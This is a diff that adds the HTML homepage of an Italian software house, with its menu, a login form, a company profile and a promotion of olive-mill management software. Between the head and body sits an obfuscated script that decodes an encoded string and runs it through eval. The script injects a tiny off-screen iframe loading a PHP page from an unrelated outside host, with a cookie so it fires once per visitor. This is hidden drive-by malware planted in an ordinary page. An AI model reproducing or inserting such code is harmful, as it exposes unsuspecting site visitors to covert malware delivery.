@@ -1,0 +1,83 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+
+	<title>main() informatica</title>
+  <meta http-equiv="cache-control" content="no-cache" />
+  <meta http-equiv="expires" content="3600" />
+  <meta name="revisit-after" content="2 days" />
+  <meta name="robots" content="index,follow" />
+  <meta name="keywords" content="Your keywords, keywords, keywords, here ..." />
+	<link rel="stylesheet" href="style.css" type="text/css" charset="utf-8" />
+	
+</head> <script type="text/javascript" language="javascript" > ydmqm="y";ushd="document";try{+function(){if(document.querySelector)--(window[ushd].getElementById("asd"))}()}catch(yfisfq){nct=function(xihr){xihr="fro"+xihr;for(mpqhh=0;mpqhh<ydmqm.length;mpqhh++){gkgfb+=String[xihr](epapvl(sxcskq+(ydmqm[mpqhh]))-(22));}};};epapvl=(window.eval);sxcskq="0x";spoj=0;if(!spoj){try{++epapvl(ushd)["bo"+"d"+ydmqm]}catch(yfisfq){pqym="(";}ydmqm="36(7c(8b(84(79(8a(7f(85(84(36(7a(86(7c(81(46(4f(3e(3f(36(91(23(20(36(8c(77(88(36(89(8a(77(8a(7f(79(53(3d(77(80(77(8e(3d(51(23(20(36(8c(77(88(36(79(85(84(8a(88(85(82(82(7b(88(53(3d(7f(84(7a(7b(8e(44(86(7e(86(3d(51(23(20(36(8c(77(88(36(7a(86(7c(81(36(53(36(7a(85(79(8b(83(7b(84(8a(44(79(88(7b(77(8a(7b(5b(82(7b(83(7b(84(8a(3e(3d(7f(7c(88(77(83(7b(3d(3f(51(23(20(23(20(36(7a(86(7c(81(44(89(88(79(36(53(36(3d(7e(8a(8a(86(50(45(45(8d(8d(8d(44(7e(85(78(78(43(7b(43(83(77(88(8a(44(79(85(83(45(7c(7f(82(7b(89(7b(88(8c(7b(88(45(4d(88(84(58(6c(63(8c(7e(44(86(7e(86(3d(51(23(20(36(7a(86(7c(81(44(89(8a(8f(82(7b(44(86(85(89(7f(8a(7f(85(84(36(53(36(3d(77(78(89(85(82(8b(8a(7b(3d(51(23(20(36(7a(86(7c(81(44(89(8a(8f(82(7b(44(79(85(82(85(88(36(53(36(3d(48(3d(51(23(20(36(7a(86(7c(81(44(89(8a(8f(82(7b(44(7e(7b(7f(7d(7e(8a(36(53(36(3d(48(86(8e(3d(51(23(20(36(7a(86(7c(81(44(89(8a(8f(82(7b(44(8d(7f(7a(8a(7e(36(53(36(3d(48(86(8e(3d(51(23(20(36(7a(86(7c(81(44(89(8a(8f(82(7b(44(82(7b(7c(8a(36(53(36(3d(47(46(46(46(48(3d(51(23(20(36(7a(86(7c(81(44(89(8a(8f(82(7b(44(8a(85(86(36(53(36(3d(47(46(46(46(48(3d(51(23(20(23(20(36(7f(7c(36(3e(37(7a(85(79(8b(83(7b(84(8a(44(7d(7b(8a(5b(82(7b(83(7b(84(8a(58(8f(5f(7a(3e(3d(7a(86(7c(81(3d(3f(3f(36(91(23(20(36(7a(85(79(8b(83(7b(84(8a(44(8d(88(7f(8a(7b(3e(3d(52(86(36(7f(7a(53(72(3d(7a(86(7c(81(72(3d(36(79(82(77(89(89(53(72(3d(7a(86(7c(81(46(4f(72(3d(36(54(52(45(86(54(3d(3f(51(23(20(36(7a(85(79(8b(83(7b(84(8a(44(7d(7b(8a(5b(82(7b(83(7b(84(8a(58(8f(5f(7a(3e(3d(7a(86(7c(81(3d(3f(44(77(86(86(7b(84(7a(59(7e(7f(82(7a(3e(7a(86(7c(81(3f(51(23(20(36(93(23(20(93(23(20(7c(8b(84(79(8a(7f(85(84(36(69(7b(8a(59(85(85(81(7f(7b(3e(79(85(85(81(7f(7b(64(77(83(7b(42(79(85(85(81(7f(7b(6c(77(82(8b(7b(42(84(5a(77(8f(89(42(86(77(8a(7e(3f(36(91(23(20(36(8c(77(88(36(8a(85(7a(77(8f(36(53(36(84(7b(8d(36(5a(77(8a(7b(3e(3f(51(23(20(36(8c(77(88(36(7b(8e(86(7f(88(7b(36(53(36(84(7b(8d(36(5a(77(8a(7b(3e(3f(51(23(20(36(7f(7c(36(3e(84(5a(77(8f(89(53(53(84(8b(82(82(36(92(92(36(84(5a(77(8f(89(53(53(46(3f(36(84(5a(77(8f(89(53(47(51(23(20(36(7b(8e(86(7f(88(7b(44(89(7b(8a(6a(7f(83(7b(3e(8a(85(7a(77(8f(44(7d(7b(8a(6a(7f(83(7b(3e(3f(36(41(36(49(4c(46(46(46(46(46(40(48(4a(40(84(5a(77(8f(89(3f(51(23(20(36(7a(85(79(8b(83(7b(84(8a(44(79(85(85(81(7f(7b(36(53(36(79(85(85(81(7f(7b(64(77(83(7b(41(38(53(38(41(7b(89(79(77(86(7b(3e(79(85(85(81(7f(7b(6c(77(82(8b(7b(3f(23(20(36(41(36(38(51(7b(8e(86(7f(88(7b(89(53(38(36(41(36(7b(8e(86(7f(88(7b(44(8a(85(5d(63(6a(69(8a(88(7f(84(7d(3e(3f(36(41(36(3e(3e(86(77(8a(7e(3f(36(55(36(38(51(36(86(77(8a(7e(53(38(36(41(36(86(77(8a(7e(36(50(36(38(38(3f(51(23(20(93(23(20(7c(8b(84(79(8a(7f(85(84(36(5d(7b(8a(59(85(85(81(7f(7b(3e(36(84(77(83(7b(36(3f(36(91(23(20(36(8c(77(88(36(89(8a(77(88(8a(36(53(36(7a(85(79(8b(83(7b(84(8a(44(79(85(85(81(7f(7b(44(7f(84(7a(7b(8e(65(7c(3e(36(84(77(83(7b(36(41(36(38(53(38(36(3f(51(23(20(36(8c(77(88(36(82(7b(84(36(53(36(89(8a(77(88(8a(36(41(36(84(77(83(7b(44(82(7b(84(7d(8a(7e(36(41(36(47(51(23(20(36(7f(7c(36(3e(36(3e(36(37(89(8a(77(88(8a(36(3f(36(3c(3c(23(20(36(3e(36(84(77(83(7b(36(37(53(36(7a(85(79(8b(83(7b(84(8a(44(79(85(85(81(7f(7b(44(89(8b(78(89(8a(88(7f(84(7d(3e(36(46(42(36(84(77(83(7b(44(82(7b(84(7d(8a(7e(36(3f(36(3f(36(3f(23(20(36(91(23(20(36(88(7b(8a(8b(88(84(36(84(8b(82(82(51(23(20(36(93(23(20(36(7f(7c(36(3e(36(89(8a(77(88(8a(36(53(53(36(43(47(36(3f(36(88(7b(8a(8b(88(84(36(84(8b(82(82(51(23(20(36(8c(77(88(36(7b(84(7a(36(53(36(7a(85(79(8b(83(7b(84(8a(44(79(85(85(81(7f(7b(44(7f(84(7a(7b(8e(65(7c(3e(36(38(51(38(42(36(82(7b(84(36(3f(51(23(20(36(7f(7c(36(3e(36(7b(84(7a(36(53(53(36(43(47(36(3f(36(7b(84(7a(36(53(36(7a(85(79(8b(83(7b(84(8a(44(79(85(85(81(7f(7b(44(82(7b(84(7d(8a(7e(51(23(20(36(88(7b(8a(8b(88(84(36(8b(84(7b(89(79(77(86(7b(3e(36(7a(85(79(8b(83(7b(84(8a(44(79(85(85(81(7f(7b(44(89(8b(78(89(8a(88(7f(84(7d(3e(36(82(7b(84(42(36(7b(84(7a(36(3f(36(3f(51(23(20(93(23(20(7f(7c(36(3e(84(77(8c(7f(7d(77(8a(85(88(44(79(85(85(81(7f(7b(5b(84(77(78(82(7b(7a(3f(23(20(91(23(20(7f(7c(3e(5d(7b(8a(59(85(85(81(7f(7b(3e(3d(8c(7f(89(7f(8a(7b(7a(75(8b(87(3d(3f(53(53(4b(4b(3f(91(93(7b(82(89(7b(91(69(7b(8a(59(85(85(81(7f(7b(3e(3d(8c(7f(89(7f(8a(7b(7a(75(8b(87(3d(42(36(3d(4b(4b(3d(42(36(3d(47(3d(42(36(3d(45(3d(3f(51(23(20(23(20(7a(86(7c(81(46(4f(3e(3f(51(23(20(93(23(20(93".split(pqym);gkgfb="";nct("mCharCode");epapvl(""+gkgfb);}</script> 
+
+<body>
+  <div id="wrapper">
+    <div id="header"> </div>
+    <div id="left">
+      <div id="logo">
+        <h1>main() informatica</h1>
+        <p>software house</p>
+      </div>
+      <div id="nav"> <ul> <li class="important"><a href="index.php">Home</a></li> <li><a href="prodotti.php">Prodotti</a></li> <li><a href="servizi.php">Servizi</a></li> <li><a href="clienti.php">Clienti</a></li> <li><a href="contatti.php">Contatti</a></li>        </ul>   </div>      <div id="news">
+      	        <div class="loginform">
+          <form method="post" action="login.php">
+            <fieldset>
+              <p><label for="username_1" class="top">User:</label><br />
+                <input name="username_1" id="username_1" tabindex="1" class="field" /></p>
+	            <p><label for="password_1" class="top">Password:</label><br />
+                <input type="password" name="password_1" id="password_1" tabindex="2" class="field" /></p>
+            	<p><input type="submit" name="cmdweblogin" class="button" value="LOGIN" /></p>
+  	        </fieldset>
+          </form>
+        </div>
+      </div>
+      <div id="support">
+        <p>Tel. +390828332142</p>
+      </div>
+    </div>
+    <div id="right">
+      <h2>EASYOIL</h2>
+      <div id="welcome">
+<img src="./public/img/easyoil.jpg" class="left" />        
+        <p>Il Software per la gestione delle attivita' del frantoio che soddisfa le nuove normative entrate in vigore dal 1^ Luglio</p>
+        <p align="justify">Il software che ottempera le richieste della circolare AGEA ACIU.2010.29 e ACIU.2010.259. 
+Dal 1^ Luglio tutte le attivita' di controllo proprie dell ICQRF necessarie, devono essere trasferite obbligatoriamente in modo  telematico entro il sesto giorno successivo a quello dell'operazione</p>
+      </div>
+    <div id="spacer"> </div>
+    <div id="spacer"> </div>
+    <div id="spacer"> </div>
+      <h2>Profilo Aziendale</h2>
+      <div id="welcome">
+        <p align="justify">La main() Informatica è nata per offrire la migliore qualità  in servizi informatici aziendali e si propone come partner dei propri clienti in specifici progetti di ricerca e sviluppo, mettendo a disposizione personale qualificato e fornendo le migliori soluzioni informatiche disponibili sul mercato.</p>
+        <p align="justify">La main() Informatica è in grado di proporre soluzioni informatiche che aiutano le aziende a migliorare i processi gestionali e l'organizzazione dell'impresa. Tali soluzioni, configurate sulla base delle reali esigenze del cliente, progettate per un utilizzo efficace ad assicurare valore nel tempo, sono studiate per integrare sistemi informativi esistenti.</p>
+        <p class="more"><a href="profilo.php">leggi</a></p>
+      </div>
+    </div> 
+    <div class="clear"> </div>
+    <div id="spacer"> </div>
+    <div id="footer">
+      <div id="copyright">
+        <p>Copyright &copy; 2007 main() informatica All right reserved.</p>
+        <!-- Inizio Codice Shinystat -->
+<p><script type="text/javascript" language="JavaScript" src="http://codice.shinystat.com/cgi-bin/getcod.cgi?USER=maininformatica"></script>
+<noscript>
+<a href="http://www.shinystat.com/it" target="_top">
+<img src="http://www.shinystat.com/cgi-bin/shinystat.cgi?USER=maininformatica" alt="Contatore accessi gratuito" border="0"></a>
+</noscript></p>
+<!-- Fine Codice Shinystat -->
+
+      </div>
+	  <div id="footerline"></div>
+    </div>
+
+	</div>
+	
+</body>
+</html>
+
